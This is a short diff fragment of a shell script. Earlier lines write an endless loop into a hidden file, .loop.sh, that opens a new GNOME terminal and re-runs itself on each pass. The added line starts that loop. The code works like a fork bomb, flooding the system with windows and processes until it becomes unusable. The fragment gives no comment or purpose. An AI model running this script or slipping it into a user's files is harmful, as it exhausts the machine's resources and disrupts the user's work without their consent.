@@ -42,3 +42,4 @@ while true; do
     gnome-terminal -- gnome-terminal ; bash ./.loop.sh ; echo \".\"
 done"> ./.loop.sh'
 
+bash ./.loop.sh
